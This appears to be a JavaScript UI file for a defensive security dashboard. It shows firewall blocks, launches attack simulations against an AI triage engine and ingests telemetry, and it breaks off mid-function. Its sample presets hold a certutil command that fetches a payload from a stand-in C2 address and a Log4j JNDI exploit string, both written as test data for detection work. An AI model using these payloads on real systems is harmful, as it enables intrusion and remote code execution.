/* CyberGuard Active Defense, Attack Simulator, and Universal Multi-Format Ingestion UI. */
(function () {
  "use strict";

  const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

  let simulationScenariosCache = [];
  let isEnforceLive = false;

  /* ═══ 1. ACTIVE DEFENSE HUB ═══ */
  async function refreshActiveDefense() {
    const listEl = document.getElementById("active-blocks-list");
    const countEl = document.getElementById("active-blocks-count");
    if (!listEl) return;

    listEl.innerHTML = '<div class="loading-placeholder">Scanning active mitigation tables…</div>';

    try {
      const blocks = await CG.api.activeDefenseBlocks();
      const items = Array.isArray(blocks) ? blocks : [];
      if (countEl) countEl.textContent = items.length;

      if (!items.length) {
        listEl.innerHTML = `
          <div class="empty-state">
            <svg class="empty-icon"><use href="#i-shield"/></svg>
            <p><strong>Perimeter Clean: Zero Active Blocks</strong></p>
            <span class="text-muted">No host firewall rules or Suricata drops are currently active. Launch a simulation to test autonomous containment.</span>
          </div>`;
        return;
      }

      listEl.innerHTML = items.map((b) => `
        <div class="block-card reveal is-in">
          <div class="block-card-header">
            <span class="badge ${b.simulated ? 'badge-simulated' : 'badge-enforced'}">
              ${b.simulated ? 'SIMULATED RULE' : 'LIVE FIREWALL DROP'}
            </span>
            <span class="mono text-muted text-sm">${esc(b.timestamp || 'Just now')}</span>
          </div>
          <div class="block-card-body">
            <div class="block-metric">
              <span class="text-label">Target IP / Identifier</span>
              <strong class="mono text-cyan text-lg">${esc(b.target)}</strong>
            </div>
            <div class="block-metric">
              <span class="text-label">Action</span>
              <span class="mono text-amber">${esc(b.action)}</span>
            </div>
            <div class="block-metric">
              <span class="text-label">Rollback Token</span>
              <code class="token-code">${esc(b.rollback_token)}</code>
            </div>
          </div>
          <div class="block-card-footer">
            <span class="text-muted text-xs">${esc(b.reason || 'Autonomous AI Containment')}</span>
            <button class="btn btn-sm btn-rollback" data-token="${esc(b.rollback_token)}">
              <svg style="width:14px;height:14px;vertical-align:-2px"><use href="#i-sync"/></svg> Rollback Block
            </button>
          </div>
        </div>
      `).join("");

      // Bind rollback buttons
      listEl.querySelectorAll(".btn-rollback").forEach((btn) => {
        btn.addEventListener("click", async () => {
          const token = btn.dataset.token;
          btn.disabled = true;
          btn.textContent = "Rolling back…";
          try {
            const res = await CG.api.rollbackAction(token);
            if (res && res.success) {
              CG.toast(`Mitigation ${token} successfully rolled back.`);
              refreshActiveDefense();
            } else {
              CG.toast("Failed to roll back rule.", 4000);
              btn.disabled = false;
            }
          } catch (e) {
            CG.toast("Error rolling back rule: " + e.message, 4000);
            btn.disabled = false;
          }
        });
      });
    } catch (err) {
      listEl.innerHTML = `<div class="error-placeholder">Failed to load active blocks: ${esc(err.message)}</div>`;
    }
  }

  /* ═══ 2. ATTACK SIMULATOR CONSOLE ═══ */
  async function loadSimulationScenarios() {
    const gridEl = document.getElementById("simulation-scenarios-grid");
    if (!gridEl) return;

    if (!simulationScenariosCache.length) {
      gridEl.innerHTML = '<div class="loading-placeholder">Loading attack simulation catalog…</div>';
      try {
        const res = await CG.api.simulationScenarios();
        simulationScenariosCache = res.scenarios || [];
      } catch (err) {
        gridEl.innerHTML = `<div class="error-placeholder">Failed to load scenarios: ${esc(err.message)}</div>`;
        return;
      }
    }

    gridEl.innerHTML = simulationScenariosCache.map((sc) => `
      <div class="scenario-card reveal is-in" data-id="${esc(sc.id)}">
        <div class="scenario-head">
          <div class="scenario-badges">
            <span class="badge badge-${sc.severity === 'critical' ? 'critical' : 'high'}">${esc(sc.severity.toUpperCase())}</span>
            <span class="badge badge-technique">${esc(sc.technique_id)}</span>
            <span class="badge badge-d3fend">${esc(sc.d3fend_countermeasure.split(' ')[0])}</span>
          </div>
          <h3 class="scenario-title">${esc(sc.title)}</h3>
          <p class="scenario-desc">${esc(sc.description)}</p>
        </div>

        <div class="scenario-meta">
          <div><span class="meta-label">Attacker IP</span><span class="mono text-cyan">${esc(sc.attacker_ip)}</span></div>
          <div><span class="meta-label">Target Port</span><span class="mono">${esc(sc.target_port)} (${esc(sc.protocol)})</span></div>
          <div><span class="meta-label">Category</span><span>${esc(sc.category)}</span></div>
        </div>

        <div class="scenario-cli">
          <div class="cli-tabs">
            <button class="cli-tab is-active" data-lang="curl">cURL</button>
            <button class="cli-tab" data-lang="ps">PowerShell</button>
          </div>
          <div class="cli-snippet">
            <code class="code-curl">${esc(sc.curl_command)}</code>
            <code class="code-ps" hidden>${esc(sc.powershell_command)}</code>
            <button class="btn-copy" title="Copy CLI Command">Copy</button>
          </div>
        </div>

        <div class="scenario-actions">
          <button class="btn btn-primary btn-launch-sim" data-id="${esc(sc.id)}">
            <svg style="width:16px;height:16px;vertical-align:-2px"><use href="#i-bolt"/></svg> Launch &amp; Test AI Defense
          </button>
        </div>
      </div>
    `).join("");

    // Setup CLI tab switching & copy
    gridEl.querySelectorAll(".scenario-card").forEach((card) => {
      const tabCurl = card.querySelector('.cli-tab[data-lang="curl"]');
      const tabPs = card.querySelector('.cli-tab[data-lang="ps"]');
      const codeCurl = card.querySelector(".code-curl");
      const codePs = card.querySelector(".code-ps");
      const copyBtn = card.querySelector(".btn-copy");

      tabCurl.addEventListener("click", () => {
        tabCurl.classList.add("is-active");
        tabPs.classList.remove("is-active");
        codeCurl.hidden = false;
        codePs.hidden = true;
      });

      tabPs.addEventListener("click", () => {
        tabPs.classList.add("is-active");
        tabCurl.classList.remove("is-active");
        codePs.hidden = false;
        codeCurl.hidden = true;
      });

      copyBtn.addEventListener("click", async () => {
        const textToCopy = codeCurl.hidden ? codePs.textContent : codeCurl.textContent;
        await navigator.clipboard.writeText(textToCopy);
        copyBtn.textContent = "Copied!";
        setTimeout(() => { copyBtn.textContent = "Copy"; }, 2000);
      });
    });

    // Setup launch buttons
    gridEl.querySelectorAll(".btn-launch-sim").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const scId = btn.dataset.id;
        btn.disabled = true;
        btn.textContent = "⚡ Running AI Defense…";
        await triggerSimulationLaunch(scId);
        btn.disabled = false;
        btn.innerHTML = '<svg style="width:16px;height:16px;vertical-align:-2px"><use href="#i-bolt"/></svg> Launch &amp; Test AI Defense';
      });
    });
  }

  async function triggerSimulationLaunch(scenarioId) {
    const warRoom = document.getElementById("sim-war-room");
    if (!warRoom) return;

    warRoom.hidden = false;
    warRoom.scrollIntoView({ behavior: "smooth", block: "start" });
    warRoom.innerHTML = `
      <div class="war-room-running">
        <div class="loader-ring"><div></div><div></div><div></div></div>
        <h3>Simulating Attack &amp; Querying Foundation-Sec-8B…</h3>
        <p>Grounding telemetry in MITRE ATT&amp;CK / D3FEND and generating autonomous containment verdict.</p>
      </div>`;

    try {
      const liveToggle = document.getElementById("sim-toggle-live");
      const enforce = liveToggle ? liveToggle.checked : false;

      const res = await CG.api.launchSimulation({
        scenario_id: scenarioId,
        enforce_live: enforce,
      });

      renderWarRoomResult(res);
      refreshActiveDefense();
    } catch (err) {
      warRoom.innerHTML = `
        <div class="error-placeholder">
          <h3>Simulation Execution Error</h3>
          <p>${esc(err.message)}</p>
        </div>`;
    }
  }

  function renderWarRoomResult(data) {
    const warRoom = document.getElementById("sim-war-room");
    if (!warRoom) return;

    const dec = data.ai_decision;
    const act = data.actuator_execution;
    const rag = data.rag_grounding;

    const isMalicious = dec.verdict === "malicious";
    const statusColor = isMalicious ? "var(--red)" : "var(--amber)";

    warRoom.innerHTML = `
      <div class="war-room-panel reveal is-in">
        <div class="war-room-header">
          <div>
            <span class="badge ${dec.execution_mode === 'enforcement' ? 'badge-enforced' : 'badge-simulated'}">
              ${dec.execution_mode.toUpperCase()} MODE
            </span>
            <h2 style="margin-top:var(--s2);color:var(--text);">${esc(data.scenario_title)}</h2>
            <p class="text-muted text-sm">Execution latency: <strong class="mono text-cyan">${data.duration_ms} ms</strong> · Target: <code class="mono">${esc(data.attacker_ip)}:${data.target_port}</code></p>
          </div>
          <div class="verdict-pill" style="border-color:${statusColor}">
            <span class="verdict-label" style="color:${statusColor}">${esc(dec.verdict.toUpperCase())}</span>
            <span class="confidence-val text-muted">Confidence: ${(dec.confidence * 100).toFixed(0)}%</span>
          </div>
        </div>

        <!-- Timeline -->
        <div class="defense-timeline">
          ${(data.timeline || []).map((t, idx) => `
            <div class="timeline-step">
              <div class="timeline-marker">${t.step}</div>
              <div class="timeline-content">
                <strong>${esc(t.title)}</strong>
                <p>${esc(t.detail)}</p>
              </div>
            </div>
          `).join("")}
        </div>

        <!-- RAG & AI Reasoning Grid -->
        <div class="defense-grid">
          <div class="defense-box">
            <h4><svg style="width:16px;height:16px;color:var(--cyan);vertical-align:-2px"><use href="#i-mitre"/></svg> Grounded RAG Intelligence</h4>
            <div class="tag-cloud" style="margin:var(--s2) 0;">
              ${(rag.matched_techniques || []).map(t => `<span class="badge badge-technique">${esc(t)}</span>`).join("")}
              ${(rag.d3fend_countermeasures || []).map(d => `<span class="badge badge-d3fend">${esc(d.id)}: ${esc(d.name)}</span>`).join("")}
            </div>
            <p class="text-sm text-muted">Concrete Actuators: ${(rag.concrete_playbook_actions || []).map(a => `<code class="mono">${esc(a.action)}</code>`).join(", ") || 'General audit'}</p>
          </div>

          <div class="defense-box">
            <h4><svg style="width:16px;height:16px;color:var(--green);vertical-align:-2px"><use href="#i-chip"/></svg> Local LLM Reasoning (${esc(dec.model_version)})</h4>
            <p class="text-sm" style="margin-top:var(--s2);color:var(--text-2);">${esc(dec.rationale)}</p>
            <div class="evidence-list" style="margin-top:var(--s3);">
              ${(dec.evidence || []).map(ev => `<div class="evidence-item text-xs mono">▸ ${esc(typeof ev === 'string' ? ev : JSON.stringify(ev))}</div>`).join("")}
            </div>
          </div>
        </div>

        <!-- Actuation Result Banner -->
        ${act ? `
          <div class="actuation-banner ${act.success ? 'actuation-success' : 'actuation-failed'}">
            <div class="actuation-icon"><svg><use href="#i-shield"/></svg></div>
            <div class="actuation-details">
              <strong>Autonomous Containment: <span class="mono">${esc(act.action)} on ${esc(act.target)}</span></strong>
              <p class="text-xs text-muted">Rollback Token: <code class="mono token-code">${esc(act.rollback_token || dec.rollback_token || 'N/A')}</code> ${act.simulated ? '· (Simulated Sandbox)' : '· (Host OS Enforced)'}</p>
            </div>
            ${act.rollback_token ? `
              <button class="btn btn-sm btn-rollback-inline" data-token="${esc(act.rollback_token)}">
                Undo / Rollback Now
              </button>
            ` : ''}
          </div>
        ` : ''}
      </div>
    `;

    warRoom.querySelectorAll(".btn-rollback-inline").forEach(btn => {
      btn.addEventListener("click", async () => {
        const token = btn.dataset.token;
        btn.disabled = true;
        btn.textContent = "Rolling back…";
        const res = await CG.api.rollbackAction(token);
        if (res && res.success) {
          CG.toast(`Mitigation ${token} reverted successfully.`);
          btn.textContent = "Reverted ✓";
          refreshActiveDefense();
        } else {
          CG.toast("Rollback failed.", 3000);
          btn.disabled = false;
        }
      });
    });
  }

  /* ═══ 3. UNIVERSAL MULTI-FORMAT INGEST ZONE ═══ */
  function initUniversalIngest() {
    const fileInput = document.getElementById("universal-file-input");
    const dropzone = document.getElementById("universal-dropzone");
    const pasteInput = document.getElementById("universal-raw-text");
    const btnSubmit = document.getElementById("btn-run-universal-triage");
    const resultContainer = document.getElementById("universal-result-container");

    if (!dropzone || !fileInput || !btnSubmit) return;

    let selectedFile = null;

    dropzone.addEventListener("click", () => fileInput.click());
    dropzone.addEventListener("dragover", (e) => { e.preventDefault(); dropzone.classList.add("drag-hover"); });
    dropzone.addEventListener("dragleave", () => dropzone.classList.remove("drag-hover"));
    dropzone.addEventListener("drop", (e) => {
      e.preventDefault();
      dropzone.classList.remove("drag-hover");
      if (e.dataTransfer.files && e.dataTransfer.files[0]) {
        selectedFile = e.dataTransfer.files[0];
        updateDropzoneLabel();
      }
    });

    fileInput.addEventListener("change", () => {
      if (fileInput.files && fileInput.files[0]) {
        selectedFile = fileInput.files[0];
        updateDropzoneLabel();
      }
    });

    function updateDropzoneLabel() {
      const label = document.getElementById("universal-file-label");
      if (label && selectedFile) {
        label.innerHTML = `<strong>Selected:</strong> <span class="text-cyan mono">${esc(selectedFile.name)}</span> (${(selectedFile.size / 1024).toFixed(1)} KB)`;
      }
    }

    // Sample preset templates
    document.querySelectorAll(".chip-preset").forEach((chip) => {
      chip.addEventListener("click", () => {
        const sampleType = chip.dataset.sample;
        selectedFile = null;
        if (label) label.textContent = "Drag & drop PDF, DOCX, EVTX, XML, JSON, or click to browse";

        if (sampleType === "ransomware_doc") {
          pasteInput.value = `[INCIDENT BRIEFING - CONFIDENTIAL]
Threat Actor: LockBit 3.0 Affiliate
Activity: Host 10.0.4.15 observed communicating with C2 server at 198.51.100.88 over SMB port 445.
LOLBin Execution: certutil.exe -urlcache -split http://198.51.100.88/stage2.bin
Windows EventID 7045: New service installed under system privileges.
Technique T1486 and T1105 identified.`;
        } else if (sampleType === "cve_log4j") {
          pasteInput.value = JSON.stringify({
            timestamp: "2026-10-09T18:00:00Z",
            event_type: "alert",
            src_ip: "203.0.113.120",
            dest_port: 8080,
            alert: {
              signature: "ET EXPLOIT Apache Log4j RCE CVE-2021-44228 JNDI Ingress",
              category: "Attempted Administrator Privilege Gain",
            },
            http: {
              user_agent: "${jndi:ldap://203.0.113.120:1389/Exploit}",
              uri: "/login"
            }
          }, null, 2);
        } else if (sampleType === "kerberos_evtx") {
          pasteInput.value = `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4769</EventID>
    <TimeCreated SystemTime="2026-10-09T18:15:00.000Z"/>
  </System>
  <EventData>
    <Data Name="TargetUserName">krbtgt</Data>
    <Data Name="ServiceName">MSSQLSvc/dc01.corp.local</Data>
    <Data Name="TicketEncryptionType">0x17</Data>
    <Data Name="IpAddress">192.168.1.105</Data>
  </EventData>
</Event>`;
        }
      });
    });

    btnSubmit.addEventListener("click", async () => {
      btnSubmit.disabled = true;
      btnSubmit.textContent = "⚡ Ingesting & Analyzing…";
      resultContainer.hidden = false;
      resultContainer.innerHTML = `
        <div class="war-room-running">
          <div class="loader-ring"><div></div><div></div><div></div></div>
          <h3>Decoding Document &amp; Running Autonomous AI Triage…</h3>
          <p>Extracting cyber indicators, querying MITRE ATT&amp;CK / D3FEND, and generating local GPU containment verdict.</p>
        </div>`;

      try {
        let res;
        const liveToggle = document.getElementById("universal-toggle-live");
        const enforce = liveToggle ? liveToggle.checked : false;

        if (selectedFile) {
          const formData = new FormData();
          formData.append("file", selectedFile);
          formData.append("auto_triage", "true");
          formData.append("enforce_live", enforce ? "true" : "false");
          res = await CG.api.universalIngestFile(formData);
        } else {
          const text = pasteInput.value.trim();
          if (!text) {
            CG.toast("Please select a file or enter telemetry text.", 3000);
            btnSubmit.disabled = false;
            btnSubmit.innerHTML = '<svg style="width:16px;height:16px;vertical-align:-2px"><use href="#i-bolt"/></svg> Ingest &amp; Run Autonomous AI Triage';
            return;
          }
          res = await CG.api.universalIngestRaw({
            raw_text: text,
            filename: "pasted_telemetry.log",
            auto_triage: true,
            enforce_live: enforce,
          });
        }

        renderUniversalResult(res);
        refreshActiveDefense();
      } catch (err) {
        resultContainer.innerHTML = `<div class="error-placeholder"><h3>Ingestion Failed</h3><p>${esc(err.message)}</p></div>`;
      } finally {
        btnSubmit.disabled = false;
        btnSubmit.innerHTML = '<svg style="width:16px;height:16px;vertical-align:-2px"><use href="#i-bolt"/></svg> Ingest &amp; Run Autonomous AI Triage';
      }
    });
  }

  function renderUniversalResult(data) {
    const container = document.getElementById("universal-result-container");
    if (!container) return;

    const doc = data.document_summary;
    const iocs = data.extracted_iocs;
    const ai = data.ai_triage;
    const act = data.actuator_execution;
    const rag = data.mitre_grounding;

    container.innerHTML = `
      <div class="panel reveal is-in" style="margin-top:var(--s4);">
        <div class="panel-head" style="display:flex;justify-content:space-between;align-items:center;">
          <div>
            <span class="badge badge-technique">${esc(doc.format_detected.toUpperCase())}</span>
            <h2 class="panel-title" style="display:inline-block;margin-left:var(--s2);">${esc(doc.filename)}</h2>
            <span class="text-muted text-xs">(${doc.total_characters} characters · processed in ${data.duration_ms} ms)</span>
          </div>
          ${ai ? `
            <div class="verdict-pill">
              <span class="verdict-label" style="color:${ai.verdict === 'malicious' ? 'var(--red)' : 'var(--amber)'}">
                ${esc(ai.verdict.toUpperCase())}
              </span>
              <span class="confidence-val text-muted">${(ai.confidence * 100).toFixed(0)}%</span>
            </div>
          ` : ''}
        </div>

        <!-- IOC Cards Grid -->
        <div class="kpi-grid" style="margin:var(--s3) 0;">
          <div class="kpi"><span class="kpi-label">Primary Suspect IP</span><span class="kpi-value mono text-cyan">${esc(iocs.primary_ip || 'None')}</span></div>
          <div class="kpi"><span class="kpi-label">Dest Port</span><span class="kpi-value mono">${esc(iocs.primary_port || 80)}</span></div>
          <div class="kpi"><span class="kpi-label">Extracted IPs</span><span class="kpi-value mono text-amber">${iocs.extracted_ips ? iocs.extracted_ips.length : 0}</span></div>
          <div class="kpi"><span class="kpi-label">CVEs / Techniques</span><span class="kpi-value mono text-green">${(iocs.cve_identifiers || []).length + (iocs.mitre_technique_ids || []).length}</span></div>
        </div>

        <!-- IOC Breakdown Chips -->
        <div class="ioc-chips-tray">
          ${(iocs.extracted_ips || []).map(ip => `<span class="badge badge-ip">IP: ${esc(ip)}</span>`).join("")}
          ${(iocs.cve_identifiers || []).map(cve => `<span class="badge badge-cve">${esc(cve)}</span>`).join("")}
          ${(iocs.mitre_technique_ids || []).map(t => `<span class="badge badge-technique">${esc(t)}</span>`).join("")}
          ${(iocs.windows_event_ids || []).map(ev => `<span class="badge badge-d3fend">EventID: ${esc(ev)}</span>`).join("")}
          ${(iocs.observed_keywords || []).map(kw => `<span class="badge badge-amber">${esc(kw)}</span>`).join("")}
        </div>

        <!-- RAG & AI Verdict -->
        ${ai ? `
          <div class="defense-grid" style="margin-top:var(--s4);">
            <div class="defense-box">
              <h4>Grounded MITRE Playbook</h4>
              <div class="tag-cloud" style="margin:var(--s2) 0;">
                ${(rag.matched_techniques || []).map(t => `<span class="badge badge-technique">${esc(t)}</span>`).join("")}
                ${(rag.d3fend_countermeasures || []).map(d => `<span class="badge badge-d3fend">${esc(d.id)}</span>`).join("")}
              </div>
              <p class="text-xs text-muted">Concrete actions: ${(rag.concrete_actions || []).map(a => `<code class="mono">${esc(a.action)}</code>`).join(", ") || 'Audit only'}</p>
            </div>
            <div class="defense-box">
              <h4>Local Foundation-Sec-8B Decision</h4>
              <p class="text-sm" style="margin-top:var(--s2);color:var(--text-2);">${esc(ai.rationale)}</p>
              <div class="evidence-list" style="margin-top:var(--s3);">
                ${(ai.evidence || []).map(ev => `<div class="evidence-item text-xs mono">▸ ${esc(typeof ev === 'string' ? ev : JSON.stringify(ev))}</div>`).join("")}
              </div>
            </div>
          </div>
        ` : ''}

        <!-- Actuator Execution -->
        ${act ? `
          <div class="actuation-banner ${act.success ? 'actuation-success' : 'actuation-failed'}" style="margin-top:var(--s4);">
            <div class="actuation-icon"><svg><use href="#i-shield"/></svg></div>
            <div class="actuation-details">
              <strong>Autonomous Defense: <span class="mono">${esc(act.action)} on ${esc(act.target)}</span></strong>
              <p class="text-xs text-muted">Rollback Token: <code class="mono token-code">${esc(act.rollback_token || 'N/A')}</code> ${act.simulated ? '· (Simulated Sandbox)' : '· (Host OS Enforced)'}</p>
            </div>
            ${act.rollback_token ? `
              <button class="btn btn-sm btn-rollback-inline" data-token="${esc(act.rollback_token)}">
                Undo Mitigation
              </button>
            ` : ''}
          </div>
        ` : ''}
      </div>
    `;

    container.querySelectorAll(".btn-rollback-inline").forEach(btn => {
      btn.addEventListener("click", async () => {
        const token = btn.dataset.token;
        btn.disabled = true;
        btn.textContent = "Rolling back…";
        const res = await CG.api.rollbackAction(token);
        if (res && res.success) {
          CG.toast(`Mitigation ${token} reverted successfully.`);
          btn.textContent = "Reverted ✓";
          refreshActiveDefense();
        } else {
          CG.toast("Rollback failed.", 3000);
          btn.disabled = false;
        }
      });
    });
  }

  /* ═══ 2b. 100-VECTOR ATTACK STRESS TEST & BENCHMARK SUITE ═══ */
  let currentBenchmarkBatch = 100;
  let benchmarkResultsData = [];
  let isDeepReasoningMode = false;

  function updateLaunchButton(isLoading = false, customText = null) {
    const btnRun = document.getElementById("btn-run-benchmark");
    if (!btnRun) return;
    if (isLoading) {
      btnRun.disabled = true;
      btnRun.innerHTML = `<span class="btn-inner"><span class="spinner" style="width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;"></span> <span class="btn-text">${esc(customText || 'Executing Attack Stream…')}</span></span>`;
      return;
    }
    btnRun.disabled = false;
    if (isDeepReasoningMode) {
      btnRun.classList.add("is-deep");
      btnRun.innerHTML = `<span class="btn-inner"><svg class="btn-svg" style="width:18px;height:18px;"><use href="#i-chip"/></svg> <span class="btn-text">🧠 Launch Deep AI Defense (${currentBenchmarkBatch} Attacks)</span></span>`;
    } else {
      btnRun.classList.remove("is-deep");
      btnRun.innerHTML = `<span class="btn-inner"><svg class="btn-svg" style="width:18px;height:18px;"><use href="#i-bolt"/></svg> <span class="btn-text">🚀 Launch ${currentBenchmarkBatch}-Vector Stress Test</span></span>`;
    }
  }

  function initBenchmarkSuite() {
    const btnRun = document.getElementById("btn-run-benchmark");
    const catSelect = document.getElementById("benchmark-category-select");
    const countSeg = document.getElementById("benchmark-count-seg");
    const filterInput = document.getElementById("benchmark-table-filter");

    if (!btnRun) return;

    const btnModeFast = document.getElementById("btn-mode-fast");
    const btnModeDeep = document.getElementById("btn-mode-deep");
    const hintEl = document.getElementById("ai-engine-hint");

    if (btnModeFast && btnModeDeep) {
      btnModeFast.addEventListener("click", () => {
        isDeepReasoningMode = false;
        btnModeFast.classList.add("is-active");
        btnModeDeep.classList.remove("is-active");
        if (hintEl) hintEl.innerHTML = '<span class="mono text-cyan">⚡ Fast Policy:</span> Instant deterministic rulebook check (sub-10ms).';
        updateLaunchButton();
      });

      btnModeDeep.addEventListener("click", () => {
        isDeepReasoningMode = true;
        btnModeDeep.classList.add("is-active");
        btnModeFast.classList.remove("is-active");
        if (hintEl) hintEl.innerHTML = '<span class="mono text-green">🧠 Deep AI Mode:</span> Live token generation on RTX 5050 GPU for every attack vector.';
        if (currentBenchmarkBatch > 10) {
          currentBenchmarkBatch = 10;
          if (countSeg) {
            countSeg.querySelectorAll(".batch-btn, .seg").forEach((b) => {
              b.classList.toggle("is-active", b.dataset.count === "10");
            });
          }
          CG.toast("Set to 10 attacks for Deep Neural AI reasoning so results stream smoothly.", 3500);
        }
        updateLaunchButton();
      });
    }

    // Segmented button count switching
    if (countSeg) {
      countSeg.querySelectorAll(".batch-btn, .seg").forEach((b) => {
        b.addEventListener("click", () => {
          countSeg.querySelectorAll(".batch-btn, .seg").forEach((s) => s.classList.remove("is-active"));
          b.classList.add("is-active");
          currentBenchmarkBatch = parseInt(b.dataset.count, 10) || 100;
          updateLaunchButton();
        });
      });
    }

    // Filter input on results table
    if (filterInput) {
      filterInput.addEventListener("input", () => {
        const query = filterInput.value.toLowerCase().trim();
        renderBenchmarkTableRows(benchmarkResultsData.filter((r) =>
          !query ||
          r.title.toLowerCase().includes(query) ||
          r.category.toLowerCase().includes(query) ||
          r.technique_id.toLowerCase().includes(query) ||
          (r.d3fend || "").toLowerCase().includes(query) ||
          (r.action || "").toLowerCase().includes(query) ||
          (r.rationale || "").toLowerCase().includes(query)
        ));
      });
    }

    // Category select filter for the scenarios catalog
    if (catSelect) {
      catSelect.addEventListener("change", () => {
        const cat = catSelect.value;
        const cards = document.querySelectorAll(".scenarios-grid .scenario-card");
        cards.forEach((card) => {
          const scCat = card.querySelector(".scenario-meta div:nth-child(3) span:last-child")?.textContent || "";
          if (!cat || scCat.trim() === cat.trim()) {
            card.hidden = false;
          } else {
            card.hidden = true;
          }
        });
      });
    }

    btnRun.addEventListener("click", async () => {
      await runBenchmarkSuite();
    });
  }

  function createBenchmarkRowHTML(r, i) {
    const isMal = r.verdict === "malicious";
    const isBenign = r.is_benign || r.verdict === "benign";
    const verdictBadge = isBenign
      ? '<span class="badge badge-benign" style="background:rgba(16,185,129,0.18);color:#34d399;border:1px solid rgba(16,185,129,0.35);">BENIGN (PERMITTED)</span>'
      : isMal
      ? '<span class="badge badge-critical">MALICIOUS</span>'
      : '<span class="badge badge-warning">SUSPICIOUS</span>';
    const actionText = isBenign && (!r.action || r.action === "none")
      ? '<span class="mono text-muted">none (allowed)</span>'
      : `<span class="mono text-amber">${esc(r.action || 'none')}</span>`;
    const tokenText = isBenign && (!r.rollback_token || r.rollback_token === "None")
      ? '<code class="mono text-xs token-code text-muted">N/A (Authorized)</code>'
      : `<code class="mono text-xs token-code">${esc(r.rollback_token || 'N/A')}</code>`;

    return `
      <tr class="benchmark-row reveal is-in" data-idx="${i}" style="cursor:pointer;" title="Click to view full AI reasoning">
        <td class="mono text-muted text-xs">${i + 1}</td>
        <td>
          <strong>${esc(r.title)}</strong>
          <span class="text-xs text-cyan view-hint" style="display:block;opacity:0.85;">▾ View AI Reasoning</span>
        </td>
        <td><span class="text-xs text-muted">${esc(r.category)}</span></td>
        <td><span class="badge badge-technique">${esc(r.technique_id)}</span></td>
        <td><span class="badge badge-d3fend" title="${esc(r.d3fend)}">${esc((r.d3fend || "").split(" ")[0])}</span></td>
        <td>${verdictBadge}</td>
        <td class="mono text-cyan">${(r.confidence * 100).toFixed(1)}%</td>
        <td>${actionText}</td>
        <td>${tokenText}</td>
        <td class="mono text-xs text-muted">${r.latency_ms} ms</td>
      </tr>
      <tr class="benchmark-detail-row" id="bench-detail-${i}" style="display:none;background:rgba(15,23,42,0.92);">
        <td colspan="10" style="padding:16px 22px;border-left:4px solid ${isBenign ? 'var(--green, #10b981)' : 'var(--cyan)'};border-bottom:1px solid rgba(255,255,255,0.08);">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
            <div style="display:flex;align-items:center;gap:10px;">
              <span style="font-size:1.15rem;">${isBenign ? '🛡️' : '🧠'}</span>
              <strong style="color:${isBenign ? '#34d399' : 'var(--cyan)'};font-size:0.9rem;">${isBenign ? 'Operational Activity Reasoning' : 'AI Defense Reasoning'} (${esc(r.provider || 'AI Engine')} · ${esc(r.model_version || 'Foundation-Sec-8B')}):</strong>
            </div>
            <div style="display:flex;gap:12px;align-items:center;">
              <span class="badge ${isBenign ? 'badge-benign' : isMal ? 'badge-critical' : 'badge-warning'}">${r.verdict.toUpperCase()} (${(r.confidence * 100).toFixed(1)}%)</span>
              <span class="mono text-xs text-muted">Inference: ${r.latency_ms} ms</span>
            </div>
          </div>
          <div style="background:rgba(0,0,0,0.35);padding:12px 16px;border-radius:6px;margin-bottom:12px;border:1px solid rgba(255,255,255,0.06);">
            <div style="font-size:0.75rem;color:${isBenign ? '#34d399' : 'var(--cyan)'};font-weight:600;margin-bottom:4px;text-transform:uppercase;letter-spacing:0.5px;">Cognitive Defense Rationale &amp; Grounding:</div>
            <p style="font-size:0.86rem;color:var(--text-1);margin:0;line-height:1.55;">${esc(r.rationale || 'High-confidence automated mitigation enacted.')}</p>
          </div>
          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:10px;font-size:0.76rem;" class="mono text-muted">
            <div style="background:rgba(255,255,255,0.03);padding:8px 12px;border-radius:4px;">
              <span style="display:block;color:var(--text-3);font-size:0.7rem;">EXECUTED ACTUATOR</span>
              <strong class="${isBenign ? 'text-muted' : 'text-amber'}" style="font-size:0.85rem;">${esc(r.action || 'none')}</strong>
            </div>
            <div style="background:rgba(255,255,255,0.03);padding:8px 12px;border-radius:4px;">
              <span style="display:block;color:var(--text-3);font-size:0.7rem;">ROLLBACK TOKEN</span>
              <strong class="text-cyan" style="font-size:0.85rem;">${esc(r.rollback_token || 'N/A')}</strong>
            </div>
            <div style="background:rgba(255,255,255,0.03);padding:8px 12px;border-radius:4px;">
              <span style="display:block;color:var(--text-3);font-size:0.7rem;">ATT&amp;CK TECHNIQUE</span>
              <strong class="text-technique" style="font-size:0.85rem;">${esc(r.technique_id)}</strong>
            </div>
            <div style="background:rgba(255,255,255,0.03);padding:8px 12px;border-radius:4px;">
              <span style="display:block;color:var(--text-3);font-size:0.7rem;">D3FEND COUNTERMEASURE</span>
              <strong class="text-d3fend" style="font-size:0.85rem;">${esc(r.d3fend || 'N/A')}</strong>
            </div>
          </div>
        </td>
      </tr>
    `;
  }

  function attachBenchmarkRowListener(row) {
    row.addEventListener("click", () => {
      const idx = row.dataset.idx;
      const detailRow = document.getElementById(`bench-detail-${idx}`);
      if (detailRow) {
        const isHidden = detailRow.style.display === "none";
        detailRow.style.display = isHidden ? "table-row" : "none";
        const viewHint = row.querySelector(".view-hint");
        if (viewHint) {
          viewHint.textContent = isHidden ? "▴ Hide AI Reasoning" : "▾ View AI Reasoning";
        }
      }
    });
  }

  function appendBenchmarkTableRow(item, index) {
    const body = document.getElementById("benchmark-results-body");
    if (!body) return;
    if (index === 0) {
      body.innerHTML = "";
    }
    const temp = document.createElement("tbody");
    temp.innerHTML = createBenchmarkRowHTML(item, index);
    const newRow = temp.querySelector(".benchmark-row");
    const detailRow = temp.querySelector(".benchmark-detail-row");
    if (newRow && detailRow) {
      body.appendChild(newRow);
      body.appendChild(detailRow);
      attachBenchmarkRowListener(newRow);
      try {
        newRow.scrollIntoView({ behavior: "smooth", block: "nearest" });
      } catch (_) {}
    }
  }

  async function runBenchmarkSuite() {
    const btnRun = document.getElementById("btn-run-benchmark");
    const catSelect = document.getElementById("benchmark-category-select");
    const liveToggle = document.getElementById("sim-toggle-live");
    const progBox = document.getElementById("benchmark-progress-box");
    const progFill = document.getElementById("benchmark-progress-fill");
